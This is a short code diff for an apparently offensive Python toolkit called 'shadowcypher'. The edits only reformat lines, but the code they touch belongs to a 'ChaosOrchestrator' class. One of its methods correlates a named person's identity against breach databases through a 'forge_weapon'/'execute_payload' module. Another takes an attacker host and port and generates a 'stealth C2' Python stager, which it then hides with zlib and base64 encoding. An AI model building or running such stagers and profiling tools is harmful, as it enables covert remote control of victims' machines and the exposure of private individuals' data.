@@ -45,16 +45,19 @@ class ChaosOrchestrator:
         from shadowcypher.modules.deephat import deephat
         
         desc = f"Deep-correlate identity {identity}. Cross-reference with known breach databases. Output risk matrix."
-        if on_output: on_output(f"[OSINT] CORRELATING_ASSETS: Synthesizing data profile for {identity}...\n")
+        if on_output:
+            on_output(f"[OSINT] CORRELATING_ASSETS: Synthesizing data profile for {identity}...\n")
         
         filename = deephat.forge_weapon(desc, category="asset_correlation")
         return deephat.execute_payload(filename, on_output=on_output)
 
     def generate_encoded_stager(self, lhost, lport, on_output=None):
         """Generate a Python stager wrapped in zlib and base64 encoding."""
-        import zlib, base64
+        import zlib
+        import base64
         from shadowcypher.modules.craft_factory import CraftFactory
-        if on_output: on_output("[PAYLOAD] GENERATING_ENCODED_STAGER...\n")
+        if on_output:
+            on_output("[PAYLOAD] GENERATING_ENCODED_STAGER...\n")
         
         path = CraftFactory.generate_stealth_c2_python(lhost, lport)
         with open(path, "rb") as f:
@@ -68,7 +71,8 @@ class ChaosOrchestrator:
         with open(encoded_path, "w") as f:
             f.write(wrapper)
             
-        if on_output: on_output(f"[SUCCESS] STAGER_GENERATED: {encoded_path}\n")
+        if on_output:
+            on_output(f"[SUCCESS] STAGER_GENERATED: {encoded_path}\n")
         return encoded_path
 
     # Keep legacy function names mapping for backwards compatibility if needed
